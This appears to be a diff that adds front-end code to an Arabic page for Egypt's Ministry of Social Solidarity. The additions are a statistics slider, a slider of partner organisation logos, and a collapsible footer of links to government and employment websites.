+        <div class="stats-card"><div class="stats-value">٩,٨٧٣</div><div class="stats-title">عدد منافذ صرف المعاشات</div><div class="stats-date">آخر تحديث: 01/5/2026</div></div>
+      </div>
+    </div>
+
+    <button class="stats-nav-btn" id="statsNext">&#8249;</button>
+  </div>
+
+  <div class="stats-dots" id="statsDots"></div>
+</section>
+
+<style>
+  .stats-section {
+    background: #0f2027;
+    padding: 48px 0 40px;
+    direction: rtl;
+  }
+
+  .stats-header {
+    text-align: center;
+    margin-bottom: 32px;
+    padding: 0 16px;
+  }
+
+  .stats-main-title {
+    font-family: 'Cairo', sans-serif;
+    font-size: 1.6rem;
+    font-weight: 800;
+    color: #fff;
+    margin: 0 0 6px;
+  }
+
+  .stats-sub {
+    font-family: 'Cairo', sans-serif;
+    font-size: 0.85rem;
+    color: rgba(255,255,255,0.6);
+    margin: 0;
+  }
+
+  .stats-slider-wrapper {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 0 16px;
+    max-width: 900px;
+    margin: 0 auto;
+  }
+
+  .stats-viewport {
+    overflow: hidden;
+    flex: 1;
+  }
+
+  .stats-track {
+    display: flex;
+    gap: 16px;
+    transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+  }
+
+  .stats-card {
+    background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 18px;
+    padding: 24px 20px;
+    flex: 0 0 calc(33.333% - 11px);
+    text-align: center;
+    backdrop-filter: blur(6px);
+    transition: background 0.3s, transform 0.3s;
+    box-sizing: border-box;
+  }
+
+  @media (max-width: 600px) {
+    .stats-card { flex: 0 0 calc(100% - 0px); }
+  }
+
+  @media (min-width: 601px) and (max-width: 850px) {
+    .stats-card { flex: 0 0 calc(50% - 8px); }
+  }
+
+  .stats-card:hover {
+    background: rgba(255,255,255,0.14);
+    transform: translateY(-4px);
+  }
+
+  .stats-nav-btn {
+    background: rgba(255,255,255,0.1);
+    border: 1px solid rgba(255,255,255,0.2);
+    color: white;
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    font-size: 1.6rem;
+    line-height: 1;
+    cursor: pointer;
+    flex-shrink: 0;
+    transition: background 0.2s, transform 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .stats-nav-btn:hover { background: var(--primary); transform: scale(1.1); }
+  .stats-nav-btn:disabled { opacity: 0.3; cursor: not-allowed; transform: none; }
+
+  .stats-value {
+    font-family: 'Cairo', sans-serif;
+    font-size: 1.8rem;
+    font-weight: 800;
+    color: #4ade80;
+    display: block;
+    margin-bottom: 8px;
+    line-height: 1.2;
+  }
+
+  .stats-title {
+    font-family: 'Cairo', sans-serif;
+    font-size: 0.88rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 10px;
+    line-height: 1.4;
+  }
+
+  .stats-date {
+    font-family: 'Cairo', sans-serif;
+    font-size: 0.75rem;
+    color: rgba(255,255,255,0.45);
+    background: rgba(255,255,255,0.06);
+    border-radius: 20px;
+    padding: 3px 12px;
+    display: inline-block;
+  }
+
+  .stats-dots {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 20px;
+  }
+
+  .stats-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.25);
+    cursor: pointer;
+    transition: background 0.2s, transform 0.2s;
+    border: none;
+    padding: 0;
+  }
+
+  .stats-dot.active { background: #4ade80; transform: scale(1.3); }
+</style>
+
+<script>
+  (function() {
+    const track    = document.getElementById('statsTrack');
+    const viewport = document.getElementById('statsViewport');
+    const prevBtn  = document.getElementById('statsPrev');
+    const nextBtn  = document.getElementById('statsNext');
+    const dotsEl   = document.getElementById('statsDots');
+
+    const cards = track.querySelectorAll('.stats-card');
+    let current = 0;
+
+    function visibleCount() {
+      const w = viewport.offsetWidth;
+      if (w < 601) return 1;
+      if (w < 851) return 2;
+      return 3;
+    }
+
+    function maxIndex() { return Math.max(0, cards.length - visibleCount()); }
+
+    function buildDots() {
+      dotsEl.innerHTML = '';
+      const total = maxIndex() + 1;
+      for (let i = 0; i < total; i++) {
+        const d = document.createElement('button');
+        d.className = 'stats-dot' + (i === current ? ' active' : '');
+        d.onclick = () => goTo(i);
+        dotsEl.appendChild(d);
+      }
+    }
+
+    function goTo(idx) {
+      current = Math.max(0, Math.min(idx, maxIndex()));
+      const cardW = cards[0].offsetWidth + 16;
+      track.style.transform = `translateX(${current * cardW}px)`;
+      prevBtn.disabled = current === 0;
+      nextBtn.disabled = current >= maxIndex();
+      dotsEl.querySelectorAll('.stats-dot').forEach((d, i) =>
+        d.classList.toggle('active', i === current)
+      );
+    }
+
+    prevBtn.addEventListener('click', () => goTo(current - 1));
+    nextBtn.addEventListener('click', () => goTo(current + 1));
+
+    window.addEventListener('resize', () => { current = 0; buildDots(); goTo(0); });
+
+    buildDots();
+    goTo(0);
+  })();
+</script>
+
+<!-- ══ شركاء النجاح ══════════════════════════════════════ -->
+<section class="partners-section">
+  <div class="partners-header">
+    <h2 class="partners-title">شركاء النجاح</h2>
+    <p class="partners-sub">الجهات الداعمة لبرنامج تكافل وكرامة</p>
+  </div>
+
+  <div class="partners-slider-wrapper">
+    <button class="partners-nav-btn" id="partnersPrev">&#8250;</button>
+
+    <div class="partners-viewport" id="partnersViewport">
+      <div class="partners-track" id="partnersTrack">
+        <div class="partner-item"><img src="https://www.moss.gov.eg/ar-eg/PublishingImages/Lists/List28/AllItems/WhatsApp%20Image%202019-01-22%20at%2010.28.15%20AM.jpeg" alt="WFP"></div>
+        <div class="partner-item"><img src="https://www.moss.gov.eg/ar-eg/PublishingImages/partners/un-women.png" alt="UN Women"></div>
+        <div class="partner-item"><img src="https://www.moss.gov.eg/ar-eg/PublishingImages/partners/orman.png" alt="جمعية الأورمان"></div>
+        <div class="partner-item"><img src="https://www.moss.gov.eg/ar-eg/PublishingImages/partners/e-finance.png" alt="e-finance"></div>
+        <div class="partner-item"><img src="https://www.moss.gov.eg/ar-eg/PublishingImages/%D8%A7%D9%84%D8%A7%D8%AE%D8%A8%D8%A7%D8%B1/%D8%B5%D9%86%D8%AF%D9%88%D9%82%20%D8%A7%D9%84%D8%A7%D9%85%D9%85.png" alt="UNFPA"></div>
+        <div class="partner-item"><img src="https://www.moss.gov.eg/ar-eg/PublishingImages/Lists/List28/AllItems/%D9%8A%D9%88%D9%86%D9%8A%D8%B3%D9%8A%D9%81%20%D8%A8%D8%A7%D9%84%D8%B9%D8%B1%D8%A8%D9%89.jpg" alt="UNICEF"></div>
+        <div class="partner-item"><img src="https://www.moss.gov.eg/ar-eg/PublishingImages/%D9%85%D9%83%D8%AA%D8%A8%D8%A9%20%D8%A7%D9%84%D9%81%D9%8A%D8%AF%D9%8A%D9%88/UNDP1.jpg" alt="UNDP"></div>
+      </div>
+    </div>
+
+    <button class="partners-nav-btn" id="partnersNext">&#8249;</button>
+  </div>
+
+  <div class="partners-dots" id="partnersDots"></div>
+</section>
+
+<style>
+  .partners-section {
+    background: #0f2027;
+    padding: 48px 0 44px;
+    direction: rtl;
+    border-top: 1px solid rgba(255,255,255,0.07);
+  }
+
+  .partners-header {
+    text-align: center;
+    margin-bottom: 32px;
+    padding: 0 16px;
+  }
+
+  .partners-title {
+    font-family: 'Cairo', sans-serif;
+    font-size: 1.6rem;
+    font-weight: 800;
+    color: #fff;
+    margin: 0 0 6px;
+  }
+
+  .partners-sub {
+    font-family: 'Cairo', sans-serif;
+    font-size: 0.85rem;
+    color: rgba(255,255,255,0.5);
+    margin: 0;
+  }
+
+  .partners-slider-wrapper {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 0 16px;
+    max-width: 900px;
+    margin: 0 auto;
+  }
+
+  .partners-viewport {
+    overflow: hidden;
+    flex: 1;
+  }
+
+  .partners-track {
+    display: flex;
+    gap: 16px;
+    transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+  }
+
+  .partner-item {
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 14px;
+    padding: 16px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    flex: 0 0 calc(25% - 12px);
+    height: 90px;
+    transition: background 0.3s, transform 0.3s;
+    box-sizing: border-box;
+  }
+
+  @media (max-width: 600px) {
+    .partner-item { flex: 0 0 calc(50% - 8px); }
+  }
+
+  @media (min-width: 601px) and (max-width: 850px) {
+    .partner-item { flex: 0 0 calc(33.333% - 11px); }
+  }
+
+  .partner-item:hover {
+    background: rgba(255,255,255,0.12);
+    transform: translateY(-3px);
+  }
+
+  .partner-item img {
+    max-width: 100%;
+    max-height: 58px;
+    object-fit: contain;
+    filter: grayscale(30%);
+    transition: filter 0.3s;
+  }
+
+  .partner-item:hover img { filter: grayscale(0%); }
+
+  .partners-nav-btn {
+    background: rgba(255,255,255,0.1);
+    border: 1px solid rgba(255,255,255,0.2);
+    color: white;
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    font-size: 1.6rem;
+    line-height: 1;
+    cursor: pointer;
+    flex-shrink: 0;
+    transition: background 0.2s, transform 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .partners-nav-btn:hover { background: var(--primary); transform: scale(1.1); }
+  .partners-nav-btn:disabled { opacity: 0.3; cursor: not-allowed; transform: none; }
+
+  .partners-dots {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 20px;
+  }
+
+  .partners-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.25);
+    cursor: pointer;
+    transition: background 0.2s, transform 0.2s;
+    border: none;
+    padding: 0;
+  }
+
+  .partners-dot.active { background: #4ade80; transform: scale(1.3); }
+</style>
+
+<script>
+  (function() {
+    const track    = document.getElementById('partnersTrack');
+    const viewport = document.getElementById('partnersViewport');
+    const prevBtn  = document.getElementById('partnersPrev');
+    const nextBtn  = document.getElementById('partnersNext');
+    const dotsEl   = document.getElementById('partnersDots');
+
+    const items = track.querySelectorAll('.partner-item');
+    let current = 0;
+
+    function visibleCount() {
+      const w = viewport.offsetWidth;
+      if (w < 601) return 2;
+      if (w < 851) return 3;
+      return 4;
+    }
+
+    function maxIndex() { return Math.max(0, items.length - visibleCount()); }
+
+    function buildDots() {
+      dotsEl.innerHTML = '';
+      const total = maxIndex() + 1;
+      for (let i = 0; i < total; i++) {
+        const d = document.createElement('button');
+        d.className = 'partners-dot' + (i === current ? ' active' : '');
+        d.onclick = () => goTo(i);
+        dotsEl.appendChild(d);
+      }
+    }
+
+    function goTo(idx) {
+      current = Math.max(0, Math.min(idx, maxIndex()));
+      const itemW = items[0].offsetWidth + 16;
+      track.style.transform = `translateX(${current * itemW}px)`;
+      prevBtn.disabled = current === 0;
+      nextBtn.disabled = current >= maxIndex();
+      dotsEl.querySelectorAll('.partners-dot').forEach((d, i) =>
+        d.classList.toggle('active', i === current)
+      );
+    }
+
+    prevBtn.addEventListener('click', () => goTo(current - 1));
+    nextBtn.addEventListener('click', () => goTo(current + 1));
+    window.addEventListener('resize', () => { current = 0; buildDots(); goTo(0); });
+
+    buildDots();
+    goTo(0);
+  })();
+</script>
+
+<style>
+  .site-footer {
+    background: #0f2027;
+    color: rgba(255,255,255,0.8);
+    margin-top: 48px;
+    padding: 40px 0 0;
+    font-family: 'Cairo', sans-serif;
+    direction: rtl;
+    border-top: 1px solid rgba(255,255,255,0.07);
+  }
+
+  /* شعار الوزارة على الموبايل في الأعلى */
+  .footer-logo-mobile {
+    display: none;
+    text-align: center;
+    margin-bottom: 24px;
+  }
+
+  /* ── أكورديون الموبايل ── */
+  /* ديسكتوب: بدون حدود أو طي */
+  @media (min-width: 768px) {
+    .footer-group        { border-bottom: none; }
+    .footer-group-body   { max-height: none !important; overflow: visible !important; padding-bottom: 0; }
+  }
+
+  .footer-group { border-bottom: 1px solid rgba(255,255,255,0.08); }
+
+  .footer-group-toggle {
+    display: none;
+    width: 100%;
+    background: none;
+    border: none;
+    color: #fff;
+    font-family: 'Cairo', sans-serif;
+    font-size: 0.95rem;
+    font-weight: 700;
+    padding: 14px 0;
+    text-align: right;
+    cursor: pointer;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .footer-group-toggle .arrow {
+    font-size: 0.75rem;
+    transition: transform 0.3s;
+    color: #4ade80;
+  }
+
+  .footer-group-toggle.open .arrow { transform: rotate(180deg); }
+
+  /* عنوان ديسكتوب */
+  .footer-group-title {
+    color: #fff;
+    font-size: 0.9rem;
+    font-weight: 700;
+    margin-bottom: 16px;
+    border-bottom: 2px solid #1a7a3c;
+    padding-bottom: 8px;
+    display: inline-block;
+  }
+
+  .footer-links-list {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .footer-links-list a {
+    color: rgba(255,255,255,0.65);
+    text-decoration: none;
+    font-size: 0.83rem;
+    transition: color 0.2s, padding-right 0.2s;
+    display: block;
+    padding: 2px 0;
+  }
+
+  .footer-links-list a:hover { color: #4ade80; padding-right: 4px; }
+
+  .footer-group-body {
+    padding-bottom: 16px;
+  }
+
+  /* شعار الديسكتوب */
+  .footer-logo-desktop {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .footer-copyright {
+    background: rgba(0,0,0,0.3);
+    margin-top: 32px;
+    padding: 14px 0;
+    text-align: center;
+  }
+
+  .footer-copyright p {
+    margin: 0;
+    font-size: 0.8rem;
+    color: rgba(255,255,255,0.45);
+  }
+
+  /* ── موبايل ── */
+  @media (max-width: 767px) {
+    .footer-logo-mobile  { display: block; }
+    .footer-logo-desktop { display: none; }
+    .footer-group-toggle { display: flex; }
+    .footer-group-title  { display: none; }
+
+    .footer-group-body {
+      overflow: hidden;
+      max-height: 0;
+      transition: max-height 0.35s ease, padding 0.35s ease;
+      padding-bottom: 0;
+    }
+
+    .footer-group-body.open {
+      max-height: 400px;
+      padding-bottom: 16px;
+    }
+
+    .footer-links-list a { font-size: 0.9rem; padding: 5px 0; }
+  }
+</style>
+
+<footer class="site-footer">
+  <div class="container">
+
+    <!-- شعار الوزارة على الموبايل -->
+    <div class="footer-logo-mobile">
+      <a href="https://www.moss.gov.eg/" target="_blank">
+        <img src="original.png" alt="MOSS" style="width:90px;height:90px;object-fit:contain;">
+      </a>
+    </div>
+
+    <div class="row gy-4">
+
+      <!-- روابط سريعة -->
+      <div class="col-md-9">
+        <div class="row footer-groups-row">
+
+          <!-- قسم 1 -->
+          <div class="col-md-4 footer-group">
+            <button class="footer-group-toggle" onclick="toggleFooter(this)">
+              <span>بوابات حكومية</span>
+              <span class="arrow">▼</span>
+            </button>
+            <span class="footer-group-title">بوابات حكومية</span>
+            <div class="footer-group-body">
+              <ul class="footer-links-list">
+                <li><a href="https://digital.gov.eg/"   target="_blank">بوابة مصر الرقمية</a></li>
+                <li><a href="http://www.eip.gov.eg/"    target="_blank">مركز معلومات مجلس الوزراء</a></li>
+                <li><a href="http://www.mcit.gov.eg/ar" target="_blank">وزارة الاتصالات وتكنولوجيا المعلومات</a></li>
+                <li><a href="http://www.mohp.gov.eg/"   target="_blank">وزارة الصحة والسكان</a></li>
+                <li><a href="http://mpmar.gov.eg/"      target="_blank">وزارة التخطيط والمتابعة والإصلاح الإداري</a></li>
+              </ul>
+            </div>
+          </div>
+
+          <!-- قسم 2 -->
+          <div class="col-md-4 footer-group">
+            <button class="footer-group-toggle" onclick="toggleFooter(this)">
+              <span>جهات حكومية</span>
+              <span class="arrow">▼</span>
+            </button>
+            <span class="footer-group-title">جهات حكومية</span>
+            <div class="footer-group-body">
+              <ul class="footer-links-list">
+                <li><a href="http://www.sis.gov.eg/?lang=ar"               target="_blank">الهيئة العامة للاستعلامات</a></li>
+                <li><a href="http://www.caoa.gov.eg/WebForms/Default.aspx" target="_blank">الجهاز المركزي للتنظيم والإدارة</a></li>
+                <li><a href="http://www.capmas.gov.eg/"                    target="_blank">الجهاز المركزي للتعبئة العامة والإحصاء</a></li>
+                <li><a href="https://cdc.gov.eg/"                          target="_blank">المركز الديموجرافي بالقاهرة</a></li>
+                <li><a href="http://www.mti.gov.eg/Arabic/Pages/default.aspx" target="_blank">وزارة التجارة والصناعة</a></li>
+              </ul>
+            </div>
+          </div>
+
+          <!-- قسم 3 -->
+          <div class="col-md-4 footer-group">
+            <button class="footer-group-toggle" onclick="toggleFooter(this)">
+              <span>خدمات وتواصل</span>
+              <span class="arrow">▼</span>
+            </button>
+            <span class="footer-group-title">خدمات وتواصل</span>
+            <div class="footer-group-body">
+              <ul class="footer-links-list">
+                <li><a href="http://www.msme.eg/ar/Pages/default.aspx"            target="_blank">جهاز تنمية المشروعات</a></li>
+                <li><a href="https://forasna.com/jobs/egypt"                       target="_blank">فرصنا</a></li>
+                <li><a href="https://www.shaghalni.com/ar/"                        target="_blank">شغلني</a></li>
+                <li><a href="https://www.moss.gov.eg/ar-eg/Pages/FAQs.aspx"       target="_blank">الأسئلة الشائعة</a></li>
+                <li><a href="https://www.moss.gov.eg/ar-eg/Pages/contact-us.aspx" target="_blank">اتصل بنا</a></li>
+              </ul>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- شعار الوزارة على الديسكتوب -->
+      <div class="col-md-3 footer-logo-desktop">
+        <a href="https://www.moss.gov.eg/" target="_blank">
+          <img src="original.png" alt="MOSS" style="width:110px;height:110px;object-fit:contain;">
+        </a>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="footer-copyright">
+    <p>جمهورية مصر العربية &nbsp;|&nbsp; وزارة التضامن الاجتماعي</p>
+  </div>
+</footer>
+
+<script>
+  function toggleFooter(btn) {
+    const body = btn.nextElementSibling.nextElementSibling;
+    const isOpen = body.classList.contains('open');
+    btn.classList.toggle('open', !isOpen);
+    body.classList.toggle('open', !isOpen);
+  }
+</script>
+
+</body>
+</html>
